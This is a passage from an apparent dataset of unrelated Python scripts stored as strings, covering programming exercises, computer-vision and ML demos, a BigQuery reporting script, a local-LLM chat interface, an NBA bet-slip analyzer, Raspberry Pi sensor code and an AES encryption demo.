the counter's current value to the world.\n#     #\n\n#     def pop(self):\n#     #\n#     # Do pop and update the counter.\n#     #\n\n\n# stk = CountingStack()\n# for i in range(100):\n#     stk.push(i)\n#     stk.pop()\n# print(stk.get_counter())\n\n####################################################################################################\n\n\nclass Stack:\n    def __init__(self):\n        self.__stk = []\n\n    def push(self, val):\n        self.__stk.append(val)\n\n    def pop(self):\n        val = self.__stk[-1]\n        del self.__stk[-1]\n        return val\n\n\nclass CountingStack(Stack):\n    def __init__(self):\n        Stack.__init__(self)\n        self.__count = 0\n\n    def get_counter(self):\n        return self.__count\n\n    def pop(self):\n        self.__count += 1\n\n        Stack.pop(self)\n\n\nstk = CountingStack()\nfor i in range(100):\n    stk.push(i)\n    stk.pop()\nprint(stk.get_counter())\n",
    "import json\nimport os\nimport glob\nimport shutil\n\n# i fucked up the files 5 times\n# Input and output folder paths\ninput_folder = 'input'\noutput_folder = 'output'\n\n# Create output folder if it doesn't exist\nif not os.path.exists(output_folder):\n    os.makedirs(output_folder)\n\n# Find input files ending with tml_dance.dtape.ckd in the input folder\ninput_files = glob.glob(os.path.join(input_folder, '*_tml_dance.dtape.ckd'))\n\nif not input_files:\n    print(\"Error: No input file found.\")\n    exit()\n\n# Read each input file\nfor input_file in input_files:\n    # Load the JSON data from file\n    with open(input_file, 'r') as f:\n        data = json.load(f)\n\n    # Extract the 'Clips' list from the data\n    clips = data.get('Clips', [])\n\n    # Separate PictogramClips and MotionClips\n    pictogram_clips = []\n    motion_clips = []\n    for clip in clips:\n        if clip['__class'] == 'PictogramClip':\n            pictogram_clips.append(clip)\n        elif clip['__class'] == 'MotionClip':\n            motion_clips.append(clip)\n\n    # Sort PictogramClips and MotionClips by their StartTime\n    sorted_pictogram_clips = sorted(pictogram_clips, key=lambda x: x.get('StartTime', 0))\n    sorted_motion_clips = sorted(motion_clips, key=lambda x: x.get('StartTime', 0))\n\n    # Combine sorted clips and MotionPlatformSpecifics\n    sorted_data = {\n        \"__class\": data[\"__class\"],\n        \"Clips\": sorted_pictogram_clips + sorted_motion_clips,\n        \"TapeClock\": data[\"TapeClock\"],\n        \"TapeBarCount\": data[\"TapeBarCount\"],\n        \"FreeResourcesAfterPlay\": data[\"FreeResourcesAfterPlay\"],\n        \"MapName\": data[\"MapName\"],\n        \"SoundwichEvent\": data[\"SoundwichEvent\"]\n    }\n\n    # Get the map name from the MapName idk\n    map_name = data[\"MapName\"]\n\n    # Output file path with the same name as the MapName in the output folder maybe\n    output_file = os.path.join(output_folder, f\"{map_name}.json\")\n\n    # Write the sorted dtapes to the output files\n    with open(output_file, 'w') as f:\n        json.dump(sorted_data, f, indent=2)\n\n    print(f\"Output file '{output_file}' created successfully.\")\n\nprint(\"All dtapes are sorted and saved in the output folder.\")\n",
    "# context.py\n'''\nClase de alto nivel que contiene todo sobre el ana\u0301lisis/ejecucio\u0301n de un programa PL0.\n\nSirve como repositorio de informacio\u0301n sobre el programa, incluido el co\u0301digo fuente, informe de errores, etc.\n'''\n#from interp  import Interpreter\nfrom AST   import node\nfrom plex    import Lexer\nfrom pparse  import Parser\n\n\nclass Context:\n\n  def __init__(self):\n    self.lexer  = Lexer(self)\n    self.parser = Parser()\n    #self.interp = Interpreter(self)\n    self.source = ''\n    self.ast    = None\n    self.have_errors = False\n\n  def parse(self, source):\n    self.have_errors = False\n    self.source = source\n    self.ast = self.parser.parse(self.lexer.tokenize(self.source))\n\n  def run(self):\n    if not self.have_errors:\n      ...\n      #checker.check()\n      #return self.interp.interpret(self.ast)\n\n  def find_source(self, node):\n    indices = self.parser.index_position(node)\n    if indices:\n      return self.source[indices[0]:indices[1]]\n    else:\n      return f'{type(node).__name__} (fuente no disponible)'\n\n  def error(self, message, position):\n    if isinstance(position, node):\n      lineno = self.parser.line_position(position)\n      (start, end) = (part_start, part_end) = self.parser.index_position(position)\n      if end == None:\n        end = start\n        part_end = start\n      while start >= 0 and self.source[start] != '\\n':\n        start -=1\n      while end < len(self.source) and self.source[end] != '\\n':\n        end += 1\n      print()\n      print(self.source[start:end])\n      print(\" \"*(part_start - start), end='')\n      print(\"^\"*(part_end - part_start))\n      print(f'{lineno}: {message}')\n\n    else:\n      print(f'{position}: {message}')\n\n    self.have_errors = True\n\n",
    "import cv2\r\nimport mediapipe as mp\r\n\r\n\r\nmp_drawing = mp.solutions.drawing_utils\r\nmp_drawing_styles = mp.solutions.drawing_styles\r\nmp_face_mesh = mp.solutions.face_mesh\r\ncap = cv2.VideoCapture(0)\r\n# For static images:\u0636\r\nIMAGE_FILES = []\r\ndrawing_spec = mp_drawing.DrawingSpec(thickness=1, circle_radius=1)\r\nwith mp_face_mesh.FaceMesh(\r\n    static_image_mode=True,\r\n    max_num_faces=1,\r\n    refine_landmarks=True,\r\n    min_detection_confidence=0.5) as face_mesh:\r\n  for idx, file in enumerate(IMAGE_FILES):\r\n    image = cv2.imread(file)\r\n    # Convert the BGR image to RGB before processing.\r\n    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))\r\n\r\n    # Print and draw face mesh landmarks on the image.\r\n    if not results.multi_face_landmarks:\r\n      continue\r\n    annotated_image = image.copy()\r\n    for face_landmarks in results.multi_face_landmarks:\r\n      print('face_landmarks:', face_landmarks)\r\n      mp_drawing.draw_landmarks(\r\n          image=annotated_image,\r\n          landmark_list=face_landmarks,\r\n          connections=mp_face_mesh.FACEMESH_TESSELATION,\r\n          landmark_drawing_spec=None,\r\n          connection_drawing_spec=mp_drawing_styles\r\n          .get_default_face_mesh_tesselation_style())\r\n      mp_drawing.draw_landmarks(\r\n          image=annotated_image,\r\n          landmark_list=face_landmarks,\r\n          connections=mp_face_mesh.FACEMESH_CONTOURS,\r\n          landmark_drawing_spec=None,\r\n          connection_drawing_spec=mp_drawing_styles\r\n          .get_default_face_mesh_contours_style())\r\n      mp_drawing.draw_landmarks(\r\n          image=annotated_image,\r\n          landmark_list=face_landmarks,\r\n          connections=mp_face_mesh.FACEMESH_IRISES,\r\n          landmark_drawing_spec=None,\r\n          connection_drawing_spec=mp_drawing_styles\r\n          .get_default_face_mesh_iris_connections_style())\r\n    cv2.imwrite('/tmp/annotated_image' + str(idx) + '.png', annotated_image)\r\n\r\n# For webcam input:\r\ndrawing_spec = mp_drawing.DrawingSpec(thickness=1, circle_radius=1)\r\nwith mp_face_mesh.FaceMesh(\r\n    max_num_faces=1,\r\n    refine_landmarks=True,\r\n    min_detection_confidence=0.5,\r\n    min_tracking_confidence=0.5) as face_mesh:\r\n  while cap.isOpened():\r\n    success, image = cap.read()\r\n    if not success:\r\n      print(\"Ignoring empty camera frame.\")\r\n      # If loading a video, use 'break' instead of 'continue'.\r\n      continue\r\n\r\n    # To improve performance, optionally mark the image as not writeable to\r\n    # pass by reference.\r\n    image.flags.writeable = False\r\n    image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\r\n    results = face_mesh.process(image)\r\n\r\n    # Draw the face mesh annotations on the image.\r\n    image.flags.writeable = True\r\n    image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)\r\n    if results.multi_face_landmarks:\r\n      for face_landmarks in results.multi_face_landmarks:\r\n        mp_drawing.draw_landmarks(\r\n            image=image,\r\n            landmark_list=face_landmarks,\r\n            connections=mp_face_mesh.FACEMESH_TESSELATION,\r\n            landmark_drawing_spec=None,\r\n            connection_drawing_spec=mp_drawing_styles\r\n            .get_default_face_mesh_tesselation_style())\r\n        mp_drawing.draw_landmarks(\r\n            image=image,\r\n            landmark_list=face_landmarks,\r\n            connections=mp_face_mesh.FACEMESH_CONTOURS,\r\n            landmark_drawing_spec=None,\r\n            connection_drawing_spec=mp_drawing_styles\r\n            .get_default_face_mesh_contours_style())\r\n        mp_drawing.draw_landmarks(\r\n            image=image,\r\n            landmark_list=face_landmarks,\r\n            connections=mp_face_mesh.FACEMESH_IRISES,\r\n            landmark_drawing_spec=None,\r\n            connection_drawing_spec=mp_drawing_styles\r\n            .get_default_face_mesh_iris_connections_style())\r\n    # Flip the image horizontally for a selfie-view display.\r\n    cv2.imshow('MediaPipe Face Mesh', cv2.flip(image, 1))\r\n    key = cv2.waitKey(5)\r\n    if key == ord(\"q\"):\r\n      break\r\ncap.release()",
    "import cv2\nfrom tensorflow.keras.models import load_model\nimport os\nfrom PIL import Image\nimport numpy as np\nimport streamlit as st\ndef imgch(img):\n    lab_img=cv2.cvtColor(img,cv2.COLOR_BGR2LAB)\n    l,a,b=cv2.split(lab_img)\n    equ=cv2.equalizeHist(l)\n    updated_lab_img =cv2.merge((equ,a,b))\n    return cv2.cvtColor(updated_lab_img,cv2.COLOR_LAB2BGR)\n\ndef prediction(model,img,size):\n    test_img=imgch(img)\n    test_img=cv2.resize(img,(size,size))\n    test_input=test_img.reshape(1,size,size,3)\n    return model.predict(test_input)[0,0]\n\ndef main():\n    st.title('Plant Disease Detection')\n    col3,col4,col5,col6,col7,col8=st.columns(6)\n    with col3:\n            original_title = '<h2 style=\"font-family:Courier;font-size: 17px;\">Gyanbardhan</h2>'\n           st.markdown(original_title, unsafe_allow_html=True)\n    with col4:\n        filename = \"gyan.jpeg\"\n        #img = cv2.imread(filename)\n        img=Image.open(filename)\n        img=img.resize((25,25))\n       #img=cv2.resize(img,(50,50))\n        #image=Image.open(img)\n        st.image(img)\n    #st.markdown(\n    #\"\"\"\n    #<link rel=\"stylesheet\" type=\"text/css\" href=\"Background.jpg\">\n    #\"\"\",\n    #unsafe_allow_html=True)\n    img=st.file_uploader(\"Upload an Image......\",type=[\"jpg\",\".webp\",\"jpeg\",\"png\"])\n    modelVGG16=load_model(\"Model_VGG16.h5\")\n    modelVGG19=load_model(\"Model_VGG19.h5\")\n    modelAN=load_model(\"AlexNetModel.h5\")\n    if img is not None:\n        image=Image.open(img)\n        img = np.asarray(image)\n        col1,col2=st.columns(2)\n        with col1:\n            #image=image.resize((150,150))\n            st.image(image)\n        with col2:\n            if st.button('Classify'):\n                p2=prediction(modelVGG16,img,150)\n                p3=prediction(modelVGG19,img,150)\n                p1=prediction(modelAN,img,227)\n                #z=p1+p2+p3/3\n                if ((2*p1+3*p2+4*p3)/9)>0.50:\n                    st.success(\"Healthy\")\n                    st.success(((2*p1+3*p2+4*p3)/9)*100)\n                else:\n                    st.success(\"Defected\")\n                    st.success((1-(2*p1+3*p2+4*p3)/9)*100)\n\n\nif __name__=='__main__':\n    main()\n",
    "from vetores_ordenados import VetorOrdenado\nfrom vetores_nao_ordenados import VetorNaoOrdenado\nimport random\nimport timeit\n\nelementos = []\nfor _ in range(10000):\n    elementos.append(round(random.random(), 4))\n\ndef insere_nao_ordenado(lista):\n    vetor = VetorNaoOrdenado(len(lista))\n    for i in lista:\n        vetor.insere(i)\n    return vetor\n\ndef insere_ordenado(lista):\n    vetor = VetorOrdenado(len(lista))\n    for i in lista:\n        vetor.insere(i)\n    return vetor\n\ndef test_insere_nao_ordenado():\n    insere_nao_ordenado(elementos)\n\ndef test_insere_ordenado():\n    insere_ordenado(elementos)\n\n# Time the execution\nprint(\"Tempo inser\u00e7\u00e3o utilizando n\u00e3o ordenado: \",timeit.timeit(test_insere_nao_ordenado, number=1))\nprint(\"Tempo inser\u00e7\u00e3o utilizando ordenado: \",timeit.timeit(test_insere_ordenado, number=1))\n\nvetor_nao_ordenado = insere_nao_ordenado(elementos)\nvetor_ordenado = insere_ordenado(elementos)\n\npesquisa = []\n\nfor _ in range(10000):\n    pesquisa.append(round(random.random(), 4))\n\ndef pesquisa_nao_ordenada(lista):\n    for i in lista:\n        vetor_nao_ordenado.pesquisar(i)\n\ndef pesquisa_ordenada(lista):\n    for i in lista:\n        vetor_ordenado.pesquisa_binaria(i)\n\ndef test_pesquisa_ordenada():\n    pesquisa_ordenada(pesquisa)\n\ndef test_pesquisa_nao_ordenada():\n    pesquisa_nao_ordenada(pesquisa)\n    \n# Time the execution\nprint(\"Tempo pesquisa utilizando n\u00e3o ordenado: \",timeit.timeit(test_pesquisa_nao_ordenada, number=1))\nprint(\"Tempo pesquisa utilizando ordenado: \",timeit.timeit(test_pesquisa_ordenada, number=1))",
    "import mysql.connector\nimport os\nimport pandas as pd\nfrom google.cloud import bigquery\nfrom google.oauth2 import service_account\nfrom google.cloud.exceptions import NotFound\nimport requests\nimport json\nfrom datetime import datetime\nfrom time import gmtime, strftime\nimport smtplib\nimport os\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.application import MIMEApplication\nfrom config import password, email # create config.py and add your email and password in it. I won't be adding config to this repo :)\n\n\n# define destination table details (abstracted)\ndataset = '[dataset_name]'\nproject_id = '[project_name]'\n\n# load credentials \npath = os.getcwd()\nos.chdir(path)\nos.system('cd {}'.format(path))\nos.system('pwd')\ncredentials = service_account.Credentials.from_service_account_file(\n   '[link/to/json/file]') \nos.environ['GOOGLE_APPLICATION_CREDENTIALS'] = '[link/to/json/file]' # like ./buypower-mobile-app-4567g0whk234.json for example (not a real keyfile name)\nprint(\"Credentials Loaded\")\n\n# define GBQ client\nclient =  bigquery.Client(project = project_id)\n\n# get current date\ndate =  strftime(\"%Y_%m_%d\", gmtime())\n\n# define function to pull data from GBQ (destination)\ndef pullDataFromBQ(query):\n   project_id = '[project_name]'\n   df = pd.read_gbq(query, project_id=project_id)\n   return df\n\n# define function to execute queries on GBQ\ndef bq_execute_query(query) -> object:\n    '''\n    This function is responsible for executing queries on Bigquery.\n    \n    It is used to run any query on Bigquery related to the data migration process.\n    \n    It takes the query and returns the results if the query ran successfully or prints the error message if the process didn't run successfully. \n    \n    See example below:\n\n    bq_execute_query(\"SELECT max(created_at) FROM bpcs.Msgs\") -> '2023-01-01' datatype: object\n    '''\n    print(query)\n    job_config = bigquery.QueryJobConfig()\n    job_config.allow_large_results = True\n    # Start the query, passing in the extra configuration.\n    try:\n        query_job = client.query(query, job_config=job_config)  # Make an API request.\n        query_job.result()  # Wait for the job to complete.\n        results = query_job.result()\n        return results\n    except Exception as e:\n        print(\"Failed to run the query {}\".format(query))\n        print(e)\n\n# get the data from GBQ and export them into csv files\ndef get_data_from_bq():\n    print(date)\n    q = f'''\n    with api_trans as (\n    select distinct api_id, ref,\n    string_agg(type,\"|\" order by id ) type_agg,\n    string_agg(distinct token_status,\"_\") token_status_agg\n    from\n    (select distinct awt.api_id,awt.ref,awt.type,awt.id,\n    if(tvr.vend_request_id is null, 'FAILED','SUCCESS') token_status,\n    FROM\n      `[dataset].[table_one_name]` awt\n    LEFT JOIN\n      `[dataset].[table_two_name]` pt\n    ON\n      awt.ref = pt.order_id\n      AND awt.api_id= pt.api_user_id\n    LEFT JOIN\n      `[dataset].[table_three_name]` vr\n    ON\n      pt.id = vr.order_id\n    LEFT JOIN\n      `[dataset].[table_four_name]` tvr\n    ON\n      vr.id = tvr.vend_request_id\n    JOIN\n      `[dataset].[table_five_name]` au\n    ON\n      awt.api_id = au.id\n      AND UPPER(au.type)='PREFUND'\n    where awt.created_at >= CAST(DATE_SUB(CURRENT_DATE(), INTERVAL 2 DAY) AS TIMESTAMP)\n    order by awt.id)\n    group by 1,2\n    )\n    -- FIRST SHEET -> Commission not given\n    select * from api_trans where type_agg ='vend' and token_status_agg = \"SUCCESS\"\n    '''\n    data = bq_execute_query(q)\n    first_data = data.to_dataframe()\n    print(first_data.info())\n    first_data.to_csv(f\"api_successful_vend_without_commission_{date}.csv\", index = False)\n\n    q = f'''\n    with api_trans as (\n    select distinct api_id, ref,\n    string_agg(type,\"|\" order by id ) type_agg,\n    string_agg(distinct token_status,\"_\") token_status_agg\n    from\n    (select distinct awt.api_id,awt.ref,awt.type,awt.id,\n    if(tvr.vend_request_id is null, 'FAILED','SUCCESS') token_status,\n    FROM\n      `[dataset].[table_one_name]` awt\n    LEFT JOIN\n      `[dataset].[table_two_name]` pt\n    ON\n      awt.ref = pt.order_id\n      AND awt.api_id= pt.api_user_id\n    LEFT JOIN\n      `[dataset].[table_three_name]` vr\n    ON\n      pt.id = vr.order_id\n    LEFT JOIN\n      `[dataset].[table_four_name]` tvr\n    ON\n      vr.id = tvr.vend_request_id\n    JOIN\n      `[dataset].[table_five_name]` au\n    ON\n      awt.api_id = au.id\n      AND UPPER(au.type)='PREFUND'\n    where awt.created_at >= CAST(DATE_SUB(CURRENT_DATE(), INTERVAL 2 DAY) AS TIMESTAMP)\n    order by awt.id)\n    group by 1,2\n    )\n    --SECOND SHEET: Failed transaction yet to be refunded\n    select * from api_trans where lower(type_agg) ='vend' and lower(type_agg) not in (\"topup\",\"transfer_topup\", \"transfer\") and token_status_agg like \"FAILED%\"\n\n    '''\n    data = bq_execute_query(q)\n    second_data = data.to_dataframe()\n    print(second_data.info())\n    second_data.to_csv(f\"api_failed_vend_yet_to_be_reversed_{",
    "import gradio as gr  # to create the web UI for the application\nfrom openai import OpenAI  # to interact with LM Studio models\nimport re  # for text manipulation\n\n# ANSI escape code for colors\nRESET_COLOR = '\\033[0m'\nNEON_GREEN = '\\033[92m'\n\nclient = OpenAI(base_url=\"http://[add_local_host_here]\", api_key=\"lm-studio\")\n\n# Initialize an empty list to store conversation history\nconversation_history = []\n\ndef format_response_text(text):\n    \"\"\"\n    Formats the response text for improved readability.\n    :param text: The raw response text.\n    :return: Formatted text.\n    \"\"\"\n    # New paragraphs after each period, question mark, or exclamation point\n    text = re.sub(r'(?<=[.!?])\\s+(?=[A-Z])', '\\n\\n', text)\n    \n    # Properly indent bullet points and numbered lists\n    text = re.sub(r'(\\n)?(\\s*)?([\u2022\\-*]|\\d+\\.)\\s+', r'\\n    \\3 ', text)\n    \n    return text\n\ndef mistral_streamed_interaction(user_input, conversation_history):\n    \"\"\"\n    Interacts with the mistral model via LM Studio, maintaining conversation context.\n    :param user_input: String, user's input.\n    :param conversation_history: List, the conversation history.\n    :return: Tuple, containing the response and updated conversation history.\n    \"\"\"\n    # Add user's input to conversation history\n    conversation_history.append({\"role\": \"user\", \"content\": user_input})\n\n    streamed_completion = client.chat.completions.create(\n        model=\"TheBloke/dolphin-2.2.1-mistral-7B-GGUF/dolphin-2.2.1-mistral-7b.Q4_K_S.gguf\",\n        messages=conversation_history,\n        stream=True  # Enable streaming\n    )\n\n    full_response = \"\"\n    line_buffer = \"\"\n\n    for chunk in streamed_completion:\n        delta_content = chunk.choices[0].delta.content\n        if delta_content:\n            line_buffer += delta_content\n            if '\\n' in line_buffer:\n                lines = line_buffer.split('\\n')\n                full_response += '\\n'.join(lines[:-1])\n                line_buffer = lines[-1]\n\n    if line_buffer:\n        full_response += line_buffer\n\n    full_response = format_response_text(full_response)\n\n    # Add model's response to conversation history\n    conversation_history.append({\"role\": \"system\", \"content\": full_response})\n\n    return full_response, conversation_history\n\ndef clear_conversation_history():\n    \"\"\"\n    Clears the conversation history.\n    \"\"\"\n    global conversation_history\n    conversation_history = []\n    print(\"Conversation history cleared.\")\n\n\ndef gradio_interface_interaction(user_input):\n    \"\"\"\n    This function acts as the bridge between the Gradio interface and the chat logic.\n    It processes the user input via the existing chat logic and returns the response.\n    \n    :param user_input: User input from the Gradio interface.\n    :return: Response text to be displayed in the Gradio interface.\n    \"\"\"\n    # Call the existing chat interaction function with the global conversation history\n    response, _ = mistral_streamed_interaction(user_input, conversation_history)\n    return response\n\n\n# Modify the Gradio interface to use the new interaction function\niface = gr.Interface(\n    fn=gradio_interface_interaction,\n    inputs=gr.Textbox(lines=2, placeholder=\"Enter your prompt here\"),\n    outputs=gr.Textbox(),\n)\n\n# Launch the Gradio interface\niface.launch()\n\n",
    "import os\nimport requests\nfrom nba_api.stats.static import players, teams\nfrom nba_api.stats.endpoints import playergamelog, commonplayerinfo\nfrom datetime import datetime, timezone\nfrom openai import OpenAI\nimport pandas as pd\nimport pytz  # If you need timezone handling\nimport json\n\n\n# Helper function to map team ID to team name\ndef get_player_team(player_name):\n  player_info = players.find_players_by_full_name(player_name)\n  if not player_info:\n    return None  # No player found\n  player_id = player_info[0]['id']\n\n  # Get detailed player information\n  player_details = commonplayerinfo.CommonPlayerInfo(player_id=player_id)\n  player_data = player_details.get_normalized_dict()\n  team_name = player_data['CommonPlayerInfo'][0]['TEAM_NAME']\n  team_city = player_data['CommonPlayerInfo'][0]['TEAM_CITY']\n  return f\"{team_city} {team_name}\"\n\n\n# Function to get today's games mapping teams to their opponents\ndef get_games():\n  games_dict = {}\n  url = 'https://site.api.espn.com/apis/site/v2/sports/basketball/nba/scoreboard'\n  response = requests.get(url)\n  if response.status_code == 200:\n    data = response.json()\n    for event in data['events']:\n      full_matchup_name = event['name']\n      team1, team2 = full_matchup_name.split(' at ')\n      games_dict[team1.strip()] = team2.strip()\n      games_dict[team2.strip()] = team1.strip()\n  return games_dict\n\n\ndef get_player_stats_against_team(player_name,\n                                  opponent_name,\n                                  metric_type,\n                                  season='2023-24'):\n  player_info = players.find_players_by_full_name(player_name)\n  if not player_info:\n    return \"Player not found\"\n  player_id = player_info[0]['id']\n\n  team_info = teams.find_teams_by_full_name(opponent_name)\n  if not team_info:\n    return \"Team not found\"\n  opponent_abbreviation = team_info[0]['abbreviation']\n\n  gamelog = playergamelog.PlayerGameLog(player_id=player_id, season=season)\n  df = gamelog.get_data_frames()[0]\n  df_opponent = df[df['MATCHUP'].str.contains(opponent_abbreviation)].copy()\n\n  try:\n    df_opponent['GAME_DATE'] = pd.to_datetime(df_opponent['GAME_DATE'],\n                                              format='%b %d, %Y',\n                                              errors='coerce')\n    df_opponent['GAME_DATE'] = df_opponent['GAME_DATE']\n    if df_opponent['GAME_DATE'].isnull().any():\n      return \"Date conversion failed.\"\n  except Exception as e:\n    return f\"Error converting dates: {str(e)}\"\n\n  # Exclude today's games based on PST\n  # Fetch the current time as timezone-aware datetime object\n  utc_now = datetime.now(timezone.utc)\n  pst_now = utc_now.astimezone(\n      pytz.timezone('US/Pacific'))  # Convert to Pacific Time\n  pst_today = pst_now.date()  # Get just the date part\n\n  df_opponent = df_opponent[df_opponent['GAME_DATE'].dt.date != pst_today]\n\n  if not df_opponent.empty:\n    df_opponent['GAME_DATE_STR'] = df_opponent['GAME_DATE'].dt.strftime(\n        '%m/%d/%Y')\n    game_results = df_opponent.apply(\n        lambda row:\n        f\"{row['GAME_DATE_STR']} {opponent_name} {row[metric_type.upper()]} {metric_type}\",\n        axis=1)\n    for result in game_results:\n      print(result)\n    average_metric = df_opponent[metric_type.upper()].astype(float).mean()\n    return average_metric\n  else:\n    return \"No matching games found or all games are from today.\"\n\n\n# Function to analyze a bet slip\ndef analyze_NBA_bet_slip(slip):\n  \"\"\"\n    Analyze a sports bet (NBA) slip and provide insights.\n\n    :param slip: A string containing the bet slip text. \n                 Ex: 'Luka Doncic OVER 44.5 PRA'\n    :return analysis: A string containing the slip analysis. \n  \"\"\"\n  client = OpenAI(api_key=os.environ['OpenAI_Key'])\n\n  response = client.chat.completions.create(\n      model=\"gpt-4-turbo-2024-04-09\",\n      response_format={\"type\": \"json_object\"},\n      messages=[\n          {\n              \"role\":\n              \"system\",\n              \"content\":\n              (\"Given a description of a sports bet, extract and format the player's name, \"\n               \"the over/under, the numerical value associated with the bet, and the type \"\n               \"of bet (e.g., points, assists, rebounds, rebounds and assists, points rebounds \"\n               \"and assists, turnovers, 3-points, etc) into a JSON structure. PRA translates to \"\n               \"points rebounds and assists. Similarly, RA translates to rebounds and assists or \"\n               \"PA translates to points and assists etc. Here's an example input and how the output \"\n               \"should be structured: Input: 'LeBron James OVER 27.5 pts.' Output should be formatted as: \"\n               \"{'player_name': 'LeBron James', 'over_or_under': 'over', 'numerical_value': 27.5, 'type_of_bet': 'points'}\"\n               ),\n          },\n          {\n              \"role\": \"user\",\n              \"content\": slip,\n          },\n      ])\n\n  # Assuming the response is correctly formatted as JSON\n  bet_details = json.loads(response.choices[0",
    "# Importing necessary libraries\nimport RPi.GPIO as Gpio  # Using \"Gpio\" as an alias for RPi.GPIO\nimport time\n\n# Set GPIO mode to BOARD (physical pin numbering)\nGpio.setmode(Gpio.BOARD)\nGpio.setwarnings(False)  # Disable GPIO warnings\nGpio.setup(8, Gpio.OUT)  # Set pin 8 as output\n\n# Define GPIO pins for ultrasonic sensor\nGpio_TRIGGER = 10  # Trigger pin\nGpio_ECHO = 12     # Echo pin\n\n# Set GPIO pin directions (Trigger as OUTPUT, Echo as INPUT)\nGpio.setup(Gpio_TRIGGER, Gpio.OUT)\nGpio.setup(Gpio_ECHO, Gpio.IN)\n\n# Function to measure distance using ultrasonic sensor\ndef distance():\n    Gpio.output(Gpio_TRIGGER, True)  # Set Trigger pin to HIGH\n    time.sleep(0.00001)              # Wait for a short duration\n    Gpio.output(Gpio_TRIGGER, False) # Set Trigger pin back to LOW\n\n    StartTime = time.time()  # Record the start time\n    StopTime = time.time()   # Record the stop time\n\n    # Wait for the Echo pin to go HIGH (start of pulse)\n    while Gpio.input(Gpio_ECHO) == 0:\n        StartTime = time.time()\n\n    # Wait for the Echo pin to go LOW again (end of pulse)\n    while Gpio.input(Gpio_ECHO) == 1:\n        StopTime = time.time()\n\n    # Calculate the time difference between start and stop\n    TimeElapsed = StopTime - StartTime\n\n    # Calculate distance based on the speed of sound\n    # (divided by 2 because sound travels to the object and back)\n    distance = (TimeElapsed * 34300) / 2\n\n    return distance\n\n# Main program\nif __name__ == '__main__':\n    try:\n        while True:\n            dist = distance()  # Get distance from the ultrasonic sensor\n            print(\"Measured Distance = %.1f cm\" % dist)  # Print the distance\n            time.sleep(1)  # Wait for 1 second\n\n            # Example: Control an output based on distance\n            # Uncomment and modify as needed\n            \n            #if dist < 10:\n            #    Gpio.output(8, Gpio.HIGH)  # Turn ON an output\n            #    time.sleep(3)  # Wait for 3 seconds\n            #    Gpio.output(8, Gpio.LOW)  # Turn OFF the output\n            #    time.sleep(1)  # Wait for 1 second\n            \n            \n    except KeyboardInterrupt:  # Handle CTRL+C interrupt\n        print(\"Measurement stopped by User\")\n        Gpio.cleanup()  # Clean up GPIO resources\n",
    "# Scenario\n# You already know how split() works. Now we want you to prove it.\n\n# Your task is to write your own function, which behaves almost exactly like the original split() method, i.e.:\n\n# it should accept exactly one argument - a string;\n# it should return a list of words created from the string, divided in the places where the string contains whitespaces;\n# if the string is empty, the function should return an empty list;\n# its name should be mysplit()\n# Use the template in the editor. Test your code carefully.\n####################################################################################################################################################\n\n# Code\n# def mysplit(strng):\n#     #\n#     # put your code here\n#     #\n# print(mysplit(\"To be or not to be, that is the question\"))\n# print(mysplit(\"To be or not to be,that is the question\"))\n# print(mysplit(\"   \"))\n# print(mysplit(\" abc \"))\n# print(mysplit(\"\"))\n\n# Expected output\n# ['To', 'be', 'or', 'not', 'to', 'be,', 'that', 'is', 'the', 'question']\n# ['To', 'be', 'or', 'not', 'to', 'be,that', 'is', 'the', 'question']\n# []\n# ['abc']\n# []\n####################################################################################################################################################\n\n\ndef mysplit(strng):\n    list = []\n    sw = False\n    indx0 = -1\n    for i in range(len(strng[:-1])):\n        if strng[i] == \" \":\n            sw = True\n        elif indx0 == -1:\n            sw = False\n            indx0 = i\n        if (sw and indx0 !=-1):\n            list.append(strng[indx0:i])\n            sw = not sw\n            indx0 = -1\n\n    if len(strng) != 0:\n        if(strng[-1]!=\" \"): \n            list.append(strng[indx0:])\n        elif strng[indx0:-1]:\n            list .append(strng[indx0:-1])\n\n    return list\n\n# def mysplit(strng):\n#     listF=[]\n#     word=\"\"\n#     for i,ch in enumerate(strng):\n#         if ch!=\" \":\n#             word+=ch\n#         elif word:\n#             listF.append(word)\n#             word=\"\"\n#     if word:\n#         listF.append(word)\n#     return listF \n\n\n\nprint(mysplit(\"To be or not to be, that is the question\"))\nprint(mysplit(\"To be or not to be,that is the question\"))\nprint(mysplit(\"   \"))\nprint(mysplit(\" abc \"))\nprint(mysplit(\"\"))\nprint(mysplit(\"     a\"))\nprint(mysplit(\" \"))\n",
    "from Crypto.Cipher import AES\r\nfrom Crypto import Random\r\nfrom binascii import b2a_hex\r\nimport sys\r\n\r\n# \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u0439 \u0442\u0435\u043a\u0441\u0442 \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\r\nplain_text = sys.argv[1]\r\n\r\n# \u0414\u043b\u0438\u043d\u0430 \u043a\u043b\u044e\u0447\u0430 \u0434\u043e\u043b\u0436\u043d\u0430 \u0431\u044b\u0442\u044c 16 (AES-128), 24 (AES-192) \u0438\u043b\u0438 32 (AES-256) \u0431\u0430\u0439\u0442.\r\nkey = b'this is a 16 key'\r\n\r\n# \u0413\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u043c \u043d\u0435\u043f\u043e\u0432\u0442\u043e\u0440\u044f\u0435\u043c\u044b\u0439 \u0432\u0435\u043a\u0442\u043e\u0440 \u043a\u043b\u044e\u0447\u0430 \u0441 \u0434\u043b\u0438\u043d\u043e\u0439,\r\n# \u0440\u0430\u0432\u043d\u043e\u0439 \u0440\u0430\u0437\u043c\u0435\u0440\u0443 \u0431\u043b\u043e\u043a\u0430 AES\r\niv = Random.new().read(AES.block_size)\r\n\r\n# \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u043c \u043e\u0431\u044a\u0435\u043a\u0442 AES \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043a\u043b\u044e\u0447\u0430 \u0438 iv, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \u0440\u0435\u0436\u0438\u043c MODE_CFB\r\nmycipher = AES.new(key, 